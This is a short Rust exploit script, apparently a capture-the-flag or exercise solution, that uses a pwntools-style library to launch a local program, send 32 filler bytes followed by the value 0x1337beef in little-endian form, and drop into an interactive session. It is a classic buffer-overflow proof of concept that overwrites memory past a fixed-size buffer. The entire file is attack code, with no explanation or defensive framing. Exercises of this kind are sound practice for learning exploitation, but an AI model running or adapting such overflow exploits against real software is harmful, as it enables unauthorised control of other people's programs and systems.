use clap::Parser;
use pwntools::{connection::Connection, connection::Process};
use std::io;

#[derive(Parser)]
struct Opts {
    program: String,
}

#[tokio::main]
async fn main() -> io::Result<()> {
    let opts = Opts::parse();

    let mut conn = Process::new(&opts.program)?;
    conn.send(&b"x".repeat(32)).await?;
    conn.send(&0x1337beef_u64.to_le_bytes()).await?;
    conn.interactive().await?;
    Ok(())
}
